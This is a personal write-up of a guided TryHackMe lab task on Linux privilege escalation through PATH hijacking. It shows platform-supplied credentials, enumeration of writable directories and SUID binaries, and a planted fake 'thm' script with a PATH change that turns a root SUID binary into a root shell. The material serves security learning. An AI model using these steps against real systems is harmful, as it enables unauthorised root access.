**Main Topic:** Linux_Privilege_Escalation
**Sub Topic:** Linux_Privesc_Writeup_PATH
**Date:** 30-05-2026
**Resources:**
**Related Notes:**
Tags: #status/done 
[Offensive_Security](/Offensive_Security/0_Offensive_Security_MOC.md) > [Linux_Privilege_Escalation](/Offensive_Security/Linux_Privilege_Escalation/0_Linux_Privilege_Escalation_MOC.md) > Linux_Privesc_Writeup_PATH

---

# TryHackMe — Linux_Privesc_Writeup_PATH

**Platform:** [TryHackMe](https://tryhackme.com)
**Room:** [Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)
**Task:** [Task 10 - PATH](https://tryhackme.com/room/linprivesc?taskNo=10&sharerId=6702abe0f77a70c90629f7db)
**Difficulty:**

> This is a guided TryHackMe room, not an independent CTF challenge.
> The target credentials were provided by the platform.
> The purpose of this writeup is to document the techniques practiced and
> reinforce learning, not to demonstrate blind exploitation.

> **Username: karen**
> **Password: Password1**

---

## Connection

```bash
$ ssh karen@10.114.169.150
```

```bash
# Shell stabilisation (if needed)
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 45 columns 188
```

---

## Question 1 — What is the odd folder you have write access for?

### Check writable directories

```bash
karen@ip-10-113-158-247:/$ find / -writable -type d 2>/dev/null  
/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service  
/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/dbus.socket  
/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/init.scope  
/sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service  
/sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/dbus.socket  
/sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/init.scope  
/proc/1275/task/1275/fd  
/proc/1275/fd  
/proc/1275/map_files  
/run/user/1001  
/run/user/1001/gnupg  
/run/user/1001/systemd  
/run/user/1001/systemd/units  
/run/screen  
/run/cloud-init/tmp  
/run/lock  
/tmp  
/tmp/.X11-unix  
/tmp/.Test-unix  
/tmp/.font-unix  
/tmp/.ICE-unix  
/tmp/.XIM-unix  
/dev/mqueue  
/dev/shm  
/home/murdoch  
/var/tmp  
/var/tmp/cloud-init  
/var/crash
```

The answer is `/home/murdoch` because of **context** — the question asks for the "odd" folder, meaning unusual/unexpected.

All the others are **expected to be writable:**

|Directory|Why writable normally|
|---|---|
|`/tmp`, `/var/tmp`|World-writable by design|
|`/dev/shm`, `/dev/mqueue`|Shared memory, world-writable by design|
|`/run/lock`, `/run/screen`|Runtime dirs, writable by design|
|`/proc/1275/...`|Your own process, you own it|
|`/sys/fs/cgroup/...`|Your own cgroup slice|
|`/run/user/1001`|Your own user runtime dir|

`/home/murdoch` is a **home directory of another user** — we should never have write access to someone else's home directory. That's the misconfiguration. It means we can plant files there, which is the basis for the PATH exploit in this room.

---

## Question 2 — Exploit the $PATH vulnerability to read the content of the flag6.txt file.
## Question 3 — What is the content of the flag6.txt file?

### Find location of flag6.txt

```bash
karen@ip-10-113-158-247:/$ find / -name flag6.txt  2>/dev/null  
/home/matt/flag6.txt
```

### Try get the flag
```bash
karen@ip-10-113-158-247:/$ cat /home/matt/flag6.txt  
cat: /home/matt/flag6.txt: Permission denied
```
> Of course we have no privileges for accessing this file.

### Exploiting the $PATH vulnerability
#### Find a vulnerable SUID binary
```bash
karen@ip-10-113-158-247:/$  find / -perm -u=s -type f 2>/dev/null  
/snap/core20/1169/usr/bin/chfn  
/snap/core20/1169/usr/bin/chsh  
/snap/core20/1169/usr/bin/gpasswd  
/snap/core20/1169/usr/bin/mount  
/snap/core20/1169/usr/bin/newgrp  
/snap/core20/1169/usr/bin/passwd  
/snap/core20/1169/usr/bin/su  
/snap/core20/1169/usr/bin/sudo  
/snap/core20/1169/usr/bin/umount  
/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/snap/core20/1169/usr/lib/openssh/ssh-keysign  
/snap/core/11993/bin/mount  
/snap/core/11993/bin/ping  
/snap/core/11993/bin/ping6  
/snap/core/11993/bin/su  
/snap/core/11993/bin/umount  
/snap/core/11993/usr/bin/chfn  
/snap/core/11993/usr/bin/chsh  
/snap/core/11993/usr/bin/gpasswd  
/snap/core/11993/usr/bin/newgrp  
/snap/core/11993/usr/bin/passwd  
/snap/core/11993/usr/bin/sudo  
/snap/core/11993/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/snap/core/11993/usr/lib/openssh/ssh-keysign  
/snap/core/11993/usr/lib/snapd/snap-confine  
/snap/core/11993/usr/sbin/pppd  
/snap/core/10185/bin/mount  
/snap/core/10185/bin/ping  
/snap/core/10185/bin/ping6  
/snap/core/10185/bin/su  
/snap/core/10185/bin/umount  
/snap/core/10185/usr/bin/chfn  
/snap/core/10185/usr/bin/chsh  
/snap/core/10185/usr/bin/gpasswd  
/snap/core/10185/usr/bin/newgrp  
/snap/core/10185/usr/bin/passwd  
/snap/core/10185/usr/bin/sudo  
/snap/core/10185/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/snap/core/10185/usr/lib/openssh/ssh-keysign  
/snap/core/10185/usr/lib/snapd/snap-confine  
/snap/core/10185/usr/sbin/pppd  
/snap/core18/2128/bin/mount  
/snap/core18/2128/bin/ping  
/snap/core18/2128/bin/su  
/snap/core18/2128/bin/umount  
/snap/core18/2128/usr/bin/chfn  
/snap/core18/2128/usr/bin/chsh  
/snap/core18/2128/usr/bin/gpasswd  
/snap/core18/2128/usr/bin/newgrp  
/snap/core18/2128/usr/bin/passwd  
/snap/core18/2128/usr/bin/sudo  
/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/snap/core18/2128/usr/lib/openssh/ssh-keysign  
/snap/core18/1885/bin/mount  
/snap/core18/1885/bin/ping  
/snap/core18/1885/bin/su  
/snap/core18/1885/bin/umount  
/snap/core18/1885/usr/bin/chfn  
/snap/core18/1885/usr/bin/chsh  
/snap/core18/1885/usr/bin/gpasswd  
/snap/core18/1885/usr/bin/newgrp  
/snap/core18/1885/usr/bin/passwd  
/snap/core18/1885/usr/bin/sudo  
/snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/snap/core18/1885/usr/lib/openssh/ssh-keysign  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/lib/openssh/ssh-keysign  
/usr/lib/policykit-1/polkit-agent-helper-1  
/usr/lib/eject/dmcrypt-get-device  
/usr/lib/snapd/snap-confine  
/usr/bin/chfn  
/usr/bin/pkexec  
/usr/bin/sudo  
/usr/bin/umount  
/usr/bin/passwd  
/usr/bin/gpasswd  
/usr/bin/newgrp  
/usr/bin/chsh  
/usr/bin/su  
/usr/bin/fusermount  
/usr/bin/at  
/usr/bin/mount  
/home/murdoch/test
```

> In 'Question 1' we cheked writable directories. Since `/home/murdoch` is writable and contains a SUID binary owned by root, it becomes our attack surface.

#### Check SUID bit
```bash
karen@ip-10-113-158-247:/home/murdoch$ ls -la  
total 32  
drwxrwxrwx 2 root root  4096 Oct 22  2021 .  
drwxr-xr-x 5 root root  4096 Jun 20  2021 ..  
-rwsr-xr-x 1 root root 16712 Jun 20  2021 test  
-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
```

#### Check `test` for  any command called without full path
```bash
karen@ip-10-113-158-247:/home/murdoch$ ltrace /home/murdoch/test  
setuid(0)                                                                                                           = -1  
setgid(0)                                                                                                           = -1  
system("thm"sh: 1: thm: not found  
<no return ...>  
--- SIGCHLD (Child exited) ---  
<... system resumed> )                                                                                              = 32512  
+++ exited (status 0) +++
```

> The binary calls `thm` without a full path. Now apply PATH hijacking.

#### Create malicious "thm" in /home/murdoch (we have write access)
```bash
karen@ip-10-113-158-247:/home/murdoch$ echo '/bin/bash' > /home/murdoch/thm  
karen@ip-10-113-158-247:/home/murdoch$ chmod +x /home/murdoch/thm
```

#### Inject /home/murdoch at the beginning of PATH
```bash
$ export PATH=/home/murdoch:$PATH

$ cat $PATH cat $PATH  
cat: '/home/murdoch:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin'
```

#### Run the SUID binary /home/murdoch/test
```bash
karen@ip-10-113-158-247:/home/murdoch$ /home/murdoch/test  
root@ip-10-113-158-247:/home/murdoch#
```

> Now we have root privileges. Let's find the flag.

### Get the flag
```bash
root@ip-10-113-158-247:/home/murdoch# cat /home/matt/flag6.txt    
THM-736628929
```
---

## Key Takeaways

- A SUID binary inherits the executing user's environment, including `$PATH` — any user can prepend a writable directory to PATH without root access
- `ltrace` is the practical alternative to `strings` for analyzing binary behavior when binutils is not installed — it intercepts library calls and prints them in readable form
- Write access to another user's home directory is always a misconfiguration — it enables file planting attacks like PATH hijacking
- The attack only works if the binary calls a command without its full path — always check with `ltrace` or `strings` before assuming exploitability

---

## Related Notes
- [Linux Privilege Escalation](/Offensive_Security/Linux_Privilege_Escalation/linux_privesc_notes.md)

---
[Offensive_Security](/Offensive_Security/0_Offensive_Security_MOC.md) > [Linux_Privilege_Escalation](/Offensive_Security/Linux_Privilege_Escalation/0_Linux_Privilege_Escalation_MOC.md) > Linux_Privesc_Writeup_PATH